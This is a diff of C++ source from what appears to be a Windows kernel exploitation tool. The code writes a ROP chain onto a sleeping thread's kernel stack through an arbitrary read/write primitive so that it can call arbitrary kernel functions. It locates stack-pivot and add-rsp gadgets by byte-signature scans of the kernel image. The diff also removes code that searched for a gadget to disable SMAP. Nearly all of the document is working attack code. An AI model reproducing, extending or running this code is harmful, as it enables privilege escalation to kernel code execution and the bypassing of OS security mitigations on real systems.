@@ -88,7 +88,6 @@ public:
 		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
 
 		DWORD currentTid = GetCurrentThreadId();
-		void* newStack = nullptr;
 
 		m_TaskQueue.push([&] {
 				LOG_DEBUG( "Starting worker, tid=%d", currentTid );
@@ -101,7 +100,7 @@ public:
 
 				LOG_DEBUG( "Calling kernel function at 0x%llx, thread address is 0x%llx", Function, thread.value() );
 				
-				OverrideThreadStackWithFunctionCall(Function, thread.value(), (Byte**)&newStack, args);
+				OverrideThreadStackWithFunctionCall(Function, thread.value(), args);
 				SetEvent(event);
 			});
 
@@ -116,6 +115,28 @@ public:
 	}
 
 private:
+
+	//
+	// Copies stack arguments from ArgsTuple into the stack, assuming the current stack
+	// pointer is Rsp, after sufficent stacj space has been reserved (see add rsp gadget).
+	// 
+	// Note: I hate C++.
+	//
+	template <typename ArgsTuple, size_t... Indicies>
+	static void CopyStackArgumentsHelper(
+		kAddress Rsp,
+		const ArgsTuple& Arguments,
+		std::index_sequence<Indicies...>) 
+	{
+		Qword remainingArgs[] = {
+			(Indicies >= 4 ? Qword( std::get<Indicies>( Arguments ) ) : Qword{})...
+		};
+
+		auto numberOfStackArgs = sizeof...(Indicies) - 4;
+		kAddress argumentsStart = Rsp - numberOfStackArgs * sizeof( Qword );
+
+		g_Rw->WriteBuffer( argumentsStart, std::span<Qword>( remainingArgs + 4, numberOfStackArgs ) );
+	}
 
 	static kAddress GetNtWaitForSingleObjectReturnAddress(
 		_In_ kAddress CallingThread,
@@ -156,7 +177,6 @@ private:
 	void OverrideThreadStackWithFunctionCall(
 		_In_ kAddress Function,
 		_In_ kAddress CallingThread,
-		Byte** NewStack,
 		_In_ std::tuple<Args...> Arguments ) 
 	{
 		//
@@ -165,45 +185,17 @@ private:
 		//
 		
 		constexpr auto NumberOfArguments = std::tuple_size<decltype(Arguments)>::value;
-		if (NumberOfArguments - 4 > m_MaxAllowedStackArguments) {
+		if (NumberOfArguments > m_MaxAllowedStackArguments + 4) {
 			LOG_FAIL( "Cannot call function 0x%llx with 0x%llx arguments, more than the allowed 0x%llx",
 				Function, NumberOfArguments, m_MaxAllowedStackArguments + 4 );
 			throw std::runtime_error( "Invalid number of arguments" );
 		}
 
-
 		std::vector<Byte> previousStackData;
 		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread, previousStackData);
 		LOG_DEBUG( "Starting to overwrite from 0x%llx", rsp );
 		
-		constexpr DWORD c_KernelStackSize = 12 * 0x1000;
-
-		// we add another page for our gadgets' shenanigens
-		constexpr DWORD c_PivotedStackSize = c_KernelStackSize + 0x1000;
-		Byte* newStack = (Byte*) VirtualAlloc(nullptr, c_KernelStackSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		*NewStack = newStack;
-
-		auto* stackTop = (Byte*)newStack + c_KernelStackSize;
-		
 #define PUT_STACK(val) do { g_Rw->WriteQword(rsp, Qword(val)); LOG_DEBUG("Rsp: 0x%llx, val:0x%llx", rsp, Qword(val)); rsp += 8; } while (false);
-
-		//
-		// NOTE: Used to disable SMAP, probably for the better? But for debug purposes we'll just 
-		// go down in the stack enough and assume that the called function doesn't do a lot lol
-		//
-
-		//PUT_STACK(m_Gadgets.DisableSmap);
-		//
-		//rsp += 0xb8;
-		//PUT_STACK(0x41); // pop r15
-		//PUT_STACK(0x41); // pop r14
-		//PUT_STACK(0x41); // pop r13
-		//PUT_STACK(0x41); // pop r12
-		//PUT_STACK(0x41); // pop rdi
-		//PUT_STACK(0x41); // pop rsi
-		//PUT_STACK(0x41); // pop rbx
-		//PUT_STACK(newStack + c_KernelStackSize); // pop rbp
-		
 		
 		// Our pivot gadget uses rbp as the new stack pointer
 
@@ -213,17 +205,8 @@ private:
 		PUT_STACK( newRsp );
 
 		PUT_STACK(m_Gadgets.StackPivot);
-		
-		//
-		// Note: We've now switched to usermode stack.
-		//
 
-		//auto userRsp = stackTop;
-
-//#undef PUT_STACK
-//#define PUT_STACK(val) *(Qword*)(userRsp)++ = Qword(val);
-
-		rsp = newRsp;
+		rsp = newRsp;		// mov rsp, rbp
 		rsp += 0x30;		// add rsp, 0x30
 		PUT_STACK(0x1337);	// pop rdi
 		PUT_STACK(0x1337);	// pop rsi
@@ -270,17 +253,13 @@ private:
 		// add remaining stack arguments
 		if constexpr (NumberOfArguments >= 5) 
 		{
-			auto indiciesOfRemainingArgs = std::make_index_sequence<NumberOfArguments - 4>{};
-			Qword remaining[] = { Qword(std::get<indiciesOfRemainingArgs>(Arguments))... };
-
-			//
-			// Write remaining arguments. The stack looks something like this right now:
-			//
-			
-			kAddress argumentsStart = rsp - sizeof( remaining );
-			g_Rw->WriteBuffer( argumentsStart, std::span<Qword>( remaining, NumberOfArguments ) );
-
+			// we've added to rsp in the prior gadget
 			rsp += m_Gadgets.AddRsp.Offset;
+			
+			CopyStackArgumentsHelper( rsp, Arguments, std::make_index_sequence<NumberOfArguments>{} );
+
+			//	add rsp, ?; ret
+			// we're here ---^
 			PUT_STACK( Function );
 		}
 
@@ -302,68 +281,19 @@ private:
 		{
 			std::function<void()> workItem;
 			{
-				std::unique_lock<std::mutex> lock(m_TaskQueueMutex);
-				m_QueueUpdateVariable.wait(lock, [this] { return !m_TaskQueue.empty() || m_TerminateWorker; });
+				std::unique_lock<std::mutex> lock( m_TaskQueueMutex );
+				m_QueueUpdateVariable.wait( lock, [this] { return !m_TaskQueue.empty() || m_TerminateWorker; } );
 
 				if (m_TerminateWorker && m_TaskQueue.empty()) {
 					return;
 				}
 
-				workItem = std::move(m_TaskQueue.front());
+				workItem = std::move( m_TaskQueue.front() );
 				m_TaskQueue.pop();
 			}
 			LOG_DEBUG( "Running work item..." );
 			workItem();
 		}
-	}
-
-	static std::optional<kAddress> TryFindSmapGadget()
-	{
-		//
-		// We'll try finding every clac; jmp instruction there is, 
-		// and use match the resulting gadget with our gadget.
-		//
-
-		LOG_DEBUG( "Trying to locate SMAP gadget" );
-
-		constexpr Byte ClacJmpRel32[] = { 0x0F, 0x01, 0xCA, 0xE9 };
-		auto signature = Sig::FromBytes(std::span<const Byte>(ClacJmpRel32));
-		
-		const std::string restOfGadgetOpcodes = "4881c4b8000000415f415e415d415c5f5e5b5dc3";
-		auto restOfGadget = Sig::FromHex(restOfGadgetOpcodes);
-
-		const Byte* smapGadget = nullptr;
-		g_KernelBinary->ForEveryCodeSignatureOccurrence(signature,
-			[&](const Byte* occurrence) -> bool {
-				LOG_DEBUG("Consumer called, occurrence=0x%08llx", occurrence);
-
-				auto* rel32 = occurrence + sizeof(ClacJmpRel32);
-				auto* jmpTarget = occurrence + *(int*)rel32 + 5 +3;
-
-				LOG_DEBUG( "Jmp target: 0x%08llx", jmpTarget );
-
-				// simple bounds check
-				if (!g_KernelBinary->InKernelBounds(jmpTarget)) return true;
-
-				auto found = Sig::FindSignatureInBuffer(
-					std::span<const Byte>(jmpTarget, jmpTarget + restOfGadget.size()),
-					restOfGadget
-				);
-
-				if (found) {
-					smapGadget = occurrence;
-					LOG_INFO( "Found SMAP gadget! 0x%08llx", smapGadget );
-					return false;
-				}
-
-				// continue searching
-				return true;
-			});
-
-		if (smapGadget) g_KernelBinary->MappedToKernel(smapGadget);
-
-		LOG_WARN( "Failed to find SMAP gadget" );
-		return std::nullopt;
 	}
 
 	static std::optional<kAddress> FindAddRspGadget( Byte& Offset )
@@ -381,6 +311,9 @@ private:
 
 		// add rsp, ?; ret
 		auto addRspRet = Sig::FromHex( "48 83 C4 * C3" );
+		LOG_DEBUG( "add rsp, ret: %p", addRspRet.data() );
+		DebugBreak();
+
 		g_KernelBinary->ForEveryCodeSignatureOccurrence( addRspRet,
 			[&]( const Byte* Occurrence) -> bool {
 				Byte rspOffset = *(Occurrence + 3);
@@ -441,12 +374,7 @@ private:
 		m_MaxAllowedStackArguments = (rspOffset - 0x20) / sizeof( Qword );
 		LOG_INFO( "Restricted to %d stack arguments at most", m_MaxAllowedStackArguments );
 
-		//auto smapGadget = TryFindSmapGadget();
-		//if (!smapGadget) return false;
-		//m_Gadgets.DisableSmap = smapGadget.value();
-
 		LOG_INFO( "Found all gadgets!" );
-
 		return true;
 	}
 
@@ -488,30 +416,6 @@ private:
 		// retn
 		//
 		kAddress StackPivot;
-
-		//
-		// Disable SMAP so we could pivot into user stack. Recall the gadget is
-		// 
-		// KiQuantumEnd:
-		// ...
-		// clac
-		// jmp     loc_14021B880
-		// 
-		// loc_14021B880:
-		// add     rsp, 0B8h
-		// pop     r15
-		// pop     r14
-		// pop     r13
-		// pop     r12
-		// pop     rdi
-		// pop     rsi
-		// pop     rbx
-		// pop     rbp
-		// retn
-		// 
-		// Note: might come later to fuck us :(
-		//
-		kAddress DisableSmap;
 
 		//
 		// Simply pop rbp; ret; 
